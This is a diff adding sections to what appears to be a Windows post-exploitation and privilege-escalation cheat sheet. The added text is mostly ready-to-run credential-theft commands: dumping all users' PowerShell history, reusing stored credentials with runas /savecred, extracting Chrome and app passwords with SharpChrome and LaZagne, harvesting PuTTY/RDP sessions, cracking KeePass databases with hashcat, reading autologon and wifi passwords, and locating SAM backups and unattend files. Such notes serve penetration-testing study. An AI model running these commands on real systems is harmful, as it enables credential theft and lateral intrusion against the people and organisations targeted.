@@ -140,7 +140,37 @@ findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
 gc (Get-PSReadLineOption).HistorySavePath          # PowerShell history
 $cred = Import-Clixml 'C:\path\pass.xml'           # saved PSCredential (reversible!)
 # also: unattend.xml, web.config, saved browser creds, cmdkey /list
+# all users' PS history:
+foreach($u in (ls C:\users).FullName){ gc "$u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -EA SilentlyContinue }
 ```
+
+### Stored-credential tools
+```text
+cmdkey /list                                   # saved creds → reuse without knowing them:
+runas /savecred /user:<dom>\<user> "<cmd>"     #   run as that user
+SharpChrome.exe logins /unprotect              # Chrome saved passwords (DPAPI)
+lazagne.exe all                                # LaZagne: dumps creds from dozens of apps
+Import-Module .\SessionGopher.ps1 ; Invoke-SessionGopher -Target <host>   # PuTTY/WinSCP/RDP saved sessions
+# KeePass db → crack offline
+keepass2john.py <db>.kdbx > kp.hash ; hashcat -m 13400 kp.hash rockyou.txt
+```
+
+### Creds in registry / config / wifi
+```text
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # Autologon DefaultPassword
+reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"                     # PuTTY proxy creds
+netsh wlan show profile <SSID> key=clear                                 # saved wifi password
+```
+
+### Other files worth grabbing (post-exploitation)
+```text
+findstr /SI /M "password" *.xml *.ini *.txt *.config
+where /R C:\ *.config ; dir /S /B *pass*.* *cred* *vnc* *.rdp
+# SAM/SYSTEM backups:  %WINDIR%\repair\sam , \system , %WINDIR%\system32\config\*.sav
+# unattend/sysprep:  C:\Windows\Panther\Unattend.xml , sysprep.inf
+# Sticky Notes DB (plum.sqlite), ntuser.dat, pagefile.sys, web.config, C:\ProgramData\Configs\*
+```
+> Snaffler (shares) + LaZagne (local apps) automate most of this. The highest-hit spots: PowerShell history, saved RDP/PuTTY sessions, `cmdkey` stored creds, unattend.xml, and web.config.
 
 ## Misc privesc vectors (more detail to come)
 - **DLL hijacking** - writable dir in a service's DLL search path -> drop a malicious DLL (incl. DNS `ServerLevelPluginDll` on a DC-DNS admin -> SYSTEM).
